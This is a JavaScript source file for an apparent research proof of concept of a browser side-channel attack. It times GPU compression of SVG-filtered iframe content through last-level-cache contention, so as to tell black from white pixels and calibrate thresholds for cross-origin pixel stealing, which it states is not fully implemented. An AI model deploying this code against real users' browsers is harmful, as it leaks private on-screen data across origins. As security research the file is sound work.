// GPU Compression Side-Channel PoC - LLC Walk Time Version
// Self-contained local version using Cache Contention Measurement

// Global variables
let haltFlag;
let warmupTime;
let pixel;
let inner_frame;
let scroll;
let frame;
let all_time; // 2D array
let rept;
let time_collect;
let pp_worker;

// Div size and layer number
let div_size;
let layer_num;

let test_mode; // true if we just want to see b/w difference without pixel stealing

// Threshold
let low;
let high;

let bwStatistics; // object to store values useful for threshold

// Current scrollLeft and scrollTop
let x, y = 0;

function updateStatus(newText) {
    document.getElementById("status").innerHTML = newText;
    console.log('[Status]', newText);
}

let onFrameStart = () => { };

async function foreverRender() {
    pixel.classList.remove("timing2");
    pixel.classList.add("timing1");
    requestAnimationFrame(async function () {
        await onFrameStart();
        pixel.classList.remove("timing1");
        pixel.classList.add("timing2");
        requestAnimationFrame(async function () {
            await onFrameStart();
            foreverRender();
        });
    });
}

let onWorkerMessage = () => { };
let frameResolve = [() => { }];
let currentArrayIndirect = [];

// Collect time array from LLC measurements
async function collectTimeArray(array) {
    currentArrayIndirect[0] = array;
    let finished = false;
    onWorkerMessage = e => {
        currentArrayIndirect[0].push(e.data);
        frameResolve[0]();
        finished && pp_worker.removeEventListener('message', onWorkerMessage);
    };
    pp_worker.addEventListener('message', onWorkerMessage);

    onFrameStart = () => new Promise((resolve, _reject) => {
        frameResolve[0] = resolve;
        pp_worker.postMessage({});
    });

    await (() => new Promise((resolve, _rej) => {
        setTimeout(() => {
            resolve();
        }, time_collect);
    }))();
    currentArrayIndirect[0] = [];
    onFrameStart = () => { };

    // Set finished flag to clean up listener
    finished = true;
}

// Initialize CCM worker (adapted for local version)
function initializeCCMWorker() {
    return new Promise((resolve, reject) => {
        try {
            // Create worker using ccm.js
            pp_worker = new Worker('ccm.js');
            
            // Wait for worker to be ready
            pp_worker.onmessage = function(e) {
                console.log('[CCM] Worker initialized');
                resolve(pp_worker);
            };
            
            pp_worker.onerror = function(error) {
                console.error('[CCM] Worker error:', error);
                reject(error);
            };
            
            // Initialize the worker
            pp_worker.postMessage({ cmd: 'init' });
        } catch (e) {
            console.error('[CCM] Failed to create worker:', e);
            reject(e);
        }
    });
}

// Adjust div size for LLC (smaller than rendering time version)
const adjustDivSize = () => {
    // Keep it small to avoid blowing up the LLC
    document.getElementById("div_size").value = 1000;
}
document.addEventListener('DOMContentLoaded', adjustDivSize, false);

function filter_content() {
    let filter = " <filter> \n ";
    filter += `<feTurbulence type="turbulence" baseFrequency="0.9 0.9" numOctaves="1" seed="1" stitchTiles="stitch" x="0" y="0" width="${div_size}px" height="${div_size}px" result="turbulence"/> \n`;
    filter += `<feBlend in="SourceGraphic" in2="turbulence" mode="multiply" result="x1"/> \n`;
    for (let i = 1; i < layer_num; i++) {
        filter += `<feBlend in="SourceGraphic" in2="x${i}" mode="multiply" result="x${i + 1}"/> \n`;
    }
    filter += " </filter> ";
    return filter;
}

// Helper function for synchronization
function waitSomeFrames(numFrames) {
    return new Promise((resolve, _reject) => {
        let count = numFrames;
        const rafBody = () => {
            if (count > 0) {
                console.log("frame count:", count);
                count--;
                requestAnimationFrame(rafBody);
            } else {
                resolve();
            }
        };
        requestAnimationFrame(rafBody);
    });
}

// Setup parameters
function setUpParams(scroll = true) {
    haltFlag = false;
    pixel = document.getElementById("pixel");
    low = parseFloat(document.getElementById("low").value);
    high = parseFloat(document.getElementById("high").value);
    div_size = parseInt(document.getElementById("div_size").value, 10);
    layer_num = parseInt(document.getElementById("layer").value, 10);
    warmupTime = 1000 * parseInt(document.getElementById("warmup_time").value, 10);
    test_mode = document.getElementById("test-mode").checked;

    // Change size
    frame = document.getElementById("frame");
    frame.style.width = div_size + 'px';
    frame.style.height = div_size + 'px';

    changeSecondaryFrameSize(div_size);

    // Set the filter
    let filterContent = filter_content();
    console.log('[Filter]', filterContent);
    document.getElementById('filter-input').value = filterContent;
    const svgElem1 = document.getElementById("input-filter1");
    svgElem1.innerHTML = filterContent;
    svgElem1.children[0].id = 'filter1';
    const svgElem2 = document.getElementById("input-filter2");
    svgElem2.innerHTML = filterContent;
    svgElem2.children[0].id = 'filter2';

    // Scroll to the pixel frame
    scroll && pixel.scrollIntoView();
}

// Main entry function
async function reconstruct() {
    setUpParams();
    // Start the attack
    attack();
}

// Main attack function
async function attack() {
    try {
        await changeFrameSrc("pixel-embed-white.html");
        changeSecondaryFrameSize(div_size);

        // Initialize CCM worker
        updateStatus('Initializing LLC measurement...');
        await initializeCCMWorker();

        const start = performance.now();
        await warmup(start, warmupTime);

        // Find Threshold: alternate black and white for time_collect
        all_time = {};

        time_collect = parseInt(document.getElementById("time").value, 10);
        rept = parseInt(document.getElementById("repetition").value, 10);

        let curr_bw = 0;
        let curr_rep = 0;

        foreverRender();

        console.log("[Calibration] Finding threshold with alternating black/white");
        updateStatus('Calibrating...');
        
        for (let i = 0; i < rept; i++) {
            console.log(`[Calibration] Iteration ${i}/${rept}`);
            curr_rep = i;
            
            if (curr_bw == 0) { // black
                await changeFrameSrc("pixel-embed-black.html");
                console.log(`[${i}] Measuring BLACK`);
                changeSecondaryFrameSize(div_size);
            } else { // white
                await changeFrameSrc("pixel-embed-white.html");
                console.log(`[${i}] Measuring WHITE`);
                changeSecondaryFrameSize(div_size);
            }
            
            await waitSomeFrames(1);
            all_time[curr_rep] = [];

            await collectTimeArray(all_time[curr_rep]);
            console.log(`[${i}] Collected ${all_time[curr_rep].length} samples`);
            curr_bw = 1 - curr_bw;
        }
        
        // Calculate statistics
        calculateBWStatistics();
        
        // Update UI with results
        document.getElementById('black-time').textContent = bwStatistics.blackMean.toFixed(2);
        document.getElementById('white-time').textContent = bwStatistics.whiteMean.toFixed(2);
        const ratio = bwStatistics.whiteMean / bwStatistics.blackMean;
        document.getElementById('timing-ratio').textContent = ratio.toFixed(3);
        
        updateStatus(`Black: ${bwStatistics.blackMean.toFixed(2)}μs, White: ${bwStatistics.whiteMean.toFixed(2)}μs, Ratio: ${ratio.toFixed(3)}`);
        
        console.log('[Results] Black Mean:', bwStatistics.blackMean);
        console.log('[Results] White Mean:', bwStatistics.whiteMean);
        console.log('[Results] Ratio:', ratio);

        // Evaluate results
        if (ratio < 1.1) {
            updateStatus('smallWarning: Warning: Very small timing difference. LLC-based detection may not work reliably.');
            console.warn('[Results] Timing difference too small for reliable detection');
        } else if (ratio > 1.5) {
            updateStatus('Done: Excellent LLC timing separation! Attack is feasible.');
        } else {
            updateStatus('Done: Good LLC timing separation. Should work.');
        }

        if (!test_mode) {
            updateStatus('Done: Full pixel stealing attack not implemented in this simplified version.');
            console.log('[Info] This is a simplified PoC. Full pixel stealing would continue here.');
        }
        
    } catch (error) {
        console.error('[Error] Attack failed:', error);
        updateStatus(' Error: ' + error.message);
    }
}

let holder = [];
async function warmup(start, total_time) {
    return new Promise(function (resolve, reject) {
        const ppListener = e => {
            if (performance.now() < (start + total_time)) {
                holder.push(e.data);
                pp_worker.postMessage({});
            } else {
                pp_worker.removeEventListener('message', ppListener);
                console.log(`[Warmup] Readings: ${holder.length}, Mean: ${getMean(holder).toFixed(2)}μs`);
                resolve();
            }
        }

        pp_worker.addEventListener('message', ppListener);
        pp_worker.postMessage({});
    });
}

// Paint pixel on reconstruction canvas (for full attack)
function paintPixel(color) {
    // Not implemented in test mode
    console.log('[Paint] Would paint pixel:', color);
}

// Scroll the victim frame (for full attack)
function scrollFrame(scrollLeft, scrollTop) {
    frame = document.getElementById("frame");
    scroll = frame.contentWindow.document.getElementById('scroll');
    if (scroll) {
        x = scroll.scrollLeft = scrollLeft;
        y = scroll.scrollTop = scrollTop;
    }
}

function changeFrameSrc(newSrc) {
    return new Promise(function (resolve, reject) {
        frame = document.getElementById("frame");
        frame.src = newSrc;
        frame.onload = function () { 
            console.log('[Frame] Loaded:', newSrc);
            resolve(); 
        }
    });
}

// Calculate black/white statistics from collected data
function calculateBWStatistics() {
    // 1. Put all black data together, and all white data together
    // Even is black, odd is white
    let bwArr = [[], []];
    for (let i = 20; i < rept; i += 1) {
        if (i >= rept) break;
        let b_or_w = i & 1;
        // Trim first 10 percent data
        if (all_time[i] && all_time[i].length > 0) {
            bwArr[b_or_w] = bwArr[b_or_w].concat(all_time[i].slice(Math.floor((all_time[i].length) / 10)));
        }
    }
    
    bwArr[0].sort(function (a, b) { return a - b });
    bwArr[1].sort(function (a, b) { return a - b });
    
    // 2. Remove top 10% and bottom 10% by slicing
    bwArr[0] = bwArr[0].slice(Math.floor((bwArr[0].length) / 10), Math.floor(9 * (bwArr[0].length) / 10));
    bwArr[1] = bwArr[1].slice(Math.floor((bwArr[1].length) / 10), Math.floor(9 * (bwArr[1].length) / 10));
    
    // 3. Get mean and median
    const bMean = bwArr[0].reduce((a, b) => a + b, 0) / bwArr[0].length;
    const bStd = Math.sqrt(bwArr[0].reduce((s, n) => s + (n - bMean) ** 2, 0) / (bwArr[0].length - 1));
    const wMean = bwArr[1].reduce((a, b) => a + b, 0) / bwArr[1].length;
    const wStd = Math.sqrt(bwArr[1].reduce((s, n) => s + (n - wMean) ** 2, 0) / (bwArr[1].length - 1));
    
    bwStatistics = {
        blackMean: bMean,
        blackMedian: bwArr[0][Math.floor(bwArr[0].length / 2)],
        blackLow: bwArr[0][0],
        blackStd: bStd,
        whiteMean: wMean,
        whiteMedian: bwArr[1][Math.floor(bwArr[1].length / 2)],
        whiteLow: bwArr[1][0],
        whiteStd: wStd,
    };
    
    console.log('[Statistics] Black:', bwStatistics.blackMean, '±', bwStatistics.blackStd);
    console.log('[Statistics] White:', bwStatistics.whiteMean, '±', bwStatistics.whiteStd);
}

// Determine if reading is likely white (for full attack)
function isLikelyWhite(reading) {
    // Trim first 10 percent data
    let reading_trim = reading.slice(Math.floor((reading.length) / 10));
    // Remove top 10% and bottom 10%
    reading_trim.sort(function (a, b) { return a - b });
    reading_trim = reading_trim.slice(Math.floor(reading_trim.length / 10), Math.floor(9 * (reading_trim.length) / 10));

    const readingMean = reading_trim.reduce((a, b) => a + b, 0) / reading_trim.length;
    const readingMedian = reading_trim[Math.floor(reading_trim.length / 2)];

    let ret = -1;

    let white_median_threshold = bwStatistics.whiteMedian + (bwStatistics.blackMedian - bwStatistics.whiteMedian) * high;
    let white_mean_threshold = bwStatistics.whiteMean + (bwStatistics.blackMean - bwStatistics.whiteMean) * high;
    if ((readingMedian > white_median_threshold) && (readingMean > white_mean_threshold)) {
        ret = 1;
    }

    let black_median_threshold = bwStatistics.whiteMedian + (bwStatistics.blackMedian - bwStatistics.whiteMedian) * low;
    let black_mean_threshold = bwStatistics.whiteMean + (bwStatistics.blackMean - bwStatistics.whiteMean) * low;
    if ((readingMedian < black_median_threshold) && (readingMean < black_mean_threshold)) {
        ret = 0;
    }
    return ret;
}

// Check for error (for full attack)
function checkerror(x, y, color) {
    let color_x_y = 1 - ((Math.floor(x / 12) + Math.floor(y / 12)) % 2);
    if (color_x_y == color) {
        return 0;
    }
    return 1;
}

// Inter-frame setup
function changeSecondaryFrameSize(size) {
    frame = document.getElementById("frame");
    if (frame.contentWindow) {
        frame.contentWindow.postMessage({ size }, '*');
    }
}

// Helper function to get mean from array
function getMean(resultArray) {
    if (!resultArray || resultArray.length === 0) return 0;
    
    resultArray = resultArray.slice(Math.floor((resultArray.length) / 5));
    resultArray.sort(function (a, b) { return a - b });
    resultArray = resultArray.slice(Math.floor(resultArray.length / 20), Math.floor(19 * (resultArray.length) / 20));
    
    return resultArray.reduce((a, b) => a + b, 0) / resultArray.length;
}

// Platform detection
function detectPlatform() {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    
    if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            document.getElementById('gpu-info').textContent = renderer;
            
            if (renderer.includes('Intel')) {
                document.getElementById('platform-info').textContent = 'INTEL-IGPU';
                return 'intel-igpu';
            } else if (renderer.includes('AMD') || renderer.includes('Radeon')) {
                document.getElementById('platform-info').textContent = 'AMD-IGPU';
                return 'amd-igpu';
            } else if (renderer.includes('NVIDIA') || renderer.includes('GeForce')) {
                document.getElementById('platform-info').textContent = 'NVIDIA-DGPU';
                document.getElementById('info-panel').style.background = '#ffcccc';
                document.getElementById('info-panel').innerHTML += '<br><strong> ERROR:</strong> NVIDIA dGPU detected. LLC-based attack will NOT work with dedicated GPU (separate cache). Please use chrome-pp instead!';
                return 'nvidia-dgpu';
            }
        }
    }
    
    document.getElementById('gpu-info').textContent = 'Unknown';
    document.getElementById('platform-info').textContent = 'UNKNOWN';
    return 'unknown';
}

// Initialize on page load
document.addEventListener('DOMContentLoaded', () => {
    console.log('[Init] GPU Compression PoC - LLC Walk Time Version');
    console.log('[Init] Self-contained local version');
    
    // Detect platform
    const platform = detectPlatform();
    
    if (platform === 'nvidia-dgpu') {
        updateStatus(' ERROR: NVIDIA dGPU not supported. Use chrome-pp instead.');
    } else if (platform === 'amd-igpu' || platform === 'intel-igpu') {
        updateStatus('Done: Compatible GPU detected. Ready to run.');
    } else {
        updateStatus('smallWarning: Unknown GPU. May or may not work.');
    }
    
    console.log('[Init] Initialization complete');
});

